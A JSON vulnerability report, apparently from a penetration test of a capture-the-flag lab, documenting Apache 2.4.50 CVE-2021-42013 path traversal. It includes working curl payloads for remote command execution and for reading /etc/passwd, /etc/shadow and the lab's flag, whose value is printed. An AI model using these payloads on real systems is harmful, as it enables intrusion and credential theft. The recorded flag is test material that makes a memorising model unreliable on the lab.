
{
  "vulnerabilities": [
    {
      "ID": "AUTHZ-VULN-01",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
      "vulnerable_code_location": "app/httpd.conf:248-250 (root directory) + httpd.conf:556-560 (CGI directory)",
      "role_context": "unauthenticated (anonymous external attacker)",
      "guard_evidence": "Root directory (/) has 'Require all granted' instead of 'Require all denied'. CGI directory has 'Require all granted' with ExecCGI enabled. No authentication or authorization checks before allowing CGI execution via path traversal.",
      "side_effect": "Remote Code Execution (RCE) with arbitrary command execution as Apache daemon user. Allows reading any file accessible to the Apache process including /FLAG.txt, /etc/passwd, application source code, and configuration files. Can execute arbitrary system commands.",
      "reason": "Apache 2.4.50 CVE-2021-42013 path traversal vulnerability combined with permissive root directory authorization (Require all granted) allows bypassing intended access controls. Double URL encoding (.%%32%65 for ../) bypasses path normalization, enabling access to arbitrary filesystem paths including /bin/sh for command execution.",
      "minimal_witness": "curl 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id' executes 'id' command. Replace 'id' with any command like 'cat /FLAG.txt' for file disclosure or 'whoami; uname -a' for system reconnaissance.",
      "confidence": "high",
      "notes": "Successfully exploited and confirmed - retrieved FLAG{a6ac61a12b93104de3b7a7db781ee95eff75310de4cf2deb1e90b57f0c824309}. Requires double URL encoding (.%%32%65 instead of .%2e) to bypass Apache 2.4.50's partial fix for CVE-2021-41773. Works because: (1) root directory grants access to entire filesystem, (2) CGI execution enabled without authentication, (3) POST data passed as commands to executed binaries. Impact: Complete server compromise possible."
    },
    {
      "ID": "AUTHZ-VULN-02",
      "vulnerability_type": "Horizontal",
      "externally_exploitable": true,
      "endpoint": "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/<any_filesystem_path>",
      "vulnerable_code_location": "app/httpd.conf:248-250",
      "role_context": "unauthenticated (anonymous external attacker)",
      "guard_evidence": "Root directory configured with 'Require all granted' provides access to entire filesystem. No ownership validation, no user/tenant isolation, no path boundary enforcement.",
      "side_effect": "Arbitrary file system access - read any file accessible to Apache daemon user across entire filesystem hierarchy, bypassing intended DocumentRoot boundaries. Enables reading sensitive files outside web root including configuration files, source code, system files, and application secrets.",
      "reason": "Path traversal via CVE-2021-42013 combined with permissive root directory authorization allows horizontal privilege escalation across filesystem boundaries. Any file the Apache process can read becomes accessible via HTTP request, violating principle of least privilege and breaking filesystem isolation.",
      "minimal_witness": "curl 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/cat' --data '/etc/passwd' reads system password file. Try '/etc/shadow', '/usr/local/apache2/conf/httpd.conf', or any application config file with credentials.",
      "confidence": "high",
      "notes": "Direct consequence of AUTHZ-VULN-01. While both use the same root cause (permissive root directory + path traversal), this finding focuses specifically on unauthorized file disclosure across user/application boundaries rather than command execution. Confirmed exploitable. Standard Apache security guidance requires 'Require all denied' on root directory to prevent exactly this attack."
    }
  ]
}